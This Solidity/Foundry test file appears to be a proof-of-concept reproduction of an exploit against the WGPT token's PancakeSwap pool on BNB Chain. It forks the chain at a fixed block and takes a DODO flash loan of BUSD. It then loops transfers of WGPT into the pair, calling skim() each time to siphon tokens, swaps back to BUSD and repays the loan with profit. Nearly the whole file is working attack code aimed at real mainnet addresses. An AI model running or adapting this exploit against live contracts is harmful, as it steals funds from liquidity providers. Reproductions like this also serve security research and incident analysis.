// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./interface.sol";

contract ContractTest is Test {

    ERC20 public wgpt = ERC20(0x1f415255f7E2a8546559a553E962dE7BC60d7942);
    ERC20 public busd = ERC20(0x55d398326f99059fF775485246999027B3197955);
    IFlashLoan public ddp = IFlashLoan(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IPancakeRouter02 public router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IPancakePair public pair = IPancakePair(0x5a596eAE0010E16ed3B021FC09BbF0b7f1B2d3cD);

    function setUp() public {
        uint256 forkId = vm.createFork("bsc", 29891709);
        vm.selectFork(forkId);
    }

    function testExp() public {
        // start flash loan
        uint256 balance = busd.balanceOf(address(ddp));
        console.log("DDP BUSD balance: %s", balance);
        ddp.flashLoan(0, balance, address(this), bytes("0x"));
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        console.log("Into DDP flash loan.");
        uint256 balance = busd.balanceOf(address(this));
        console.log("Exp BUSD balance: %s", balance);
        busd.approve(address(router), type(uint256).max);
        wgpt.approve(address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(busd);
        path[1] = address(wgpt); 

        console.log("Swap some busd to wgpt.");
        router.swapExactTokensForTokens(balance/2, 0, path, address(this), 1689145688);
        wgpt.approve(address(this), type(uint256).max);
        //uint256 sub = myBalance/25;

        for (uint256 i=0;i<100000;i++) {
            // myBalance = myBalance - sub;
            // uint256 myBalance = wgpt.balanceOf(address(this));
            // uint256 pairBusdBalance = busd.balanceOf(address(pair));
            
            // uint256[] memory inOut = router.getAmountsOut(pairBusdBalance, path);
            // uint256 amount = inOut[1];
        
            // if (amount>myBalance) {amount = myBalance;}

            // console.log("Out: %s; Amount: %s", inOut[1], amount);

            //if (wgpt.balanceOf(address(pair)) <= 514940831166594956298) break;

            wgpt.transferFrom(address(this), address(pair), 1202208248508717550);
            pair.skim(address(this));
            console.log("Pair WFPT: %s; BSUD: %s", 
                wgpt.balanceOf(address(pair)),
                busd.balanceOf(address(pair))
            );

            // (uint112 _reserve0, , ) = pair.getReserves();
            // console.log("Pair WGPT reserve: %s", _reserve0);
        }

        address[] memory path1 = new address[](2);
        path1[0] = address(wgpt);
        path1[1] = address(busd); 

        uint256 myBalance1 = wgpt.balanceOf(address(this));
        console.log("My WGPT balance: %s", myBalance1);

        // uint256[] memory out = router.getAmountsOut(myBalance1, path1);

        // wgpt.transfer(address(pair), myBalance1);
        // bytes memory emptyBytes;
        // pair.swap(0, out[1], address(this), emptyBytes);
        router.swapExactTokensForTokens(myBalance1, 0, path1, address(this), 1689145688);

        console.log("My BUSD balance: %s", busd.balanceOf(address(this)));
        console.log("quoteAmount: %s", quoteAmount);
        busd.transfer(address(ddp), quoteAmount);
        console.log("My BUSD balance: %s", busd.balanceOf(address(this)));
    }
}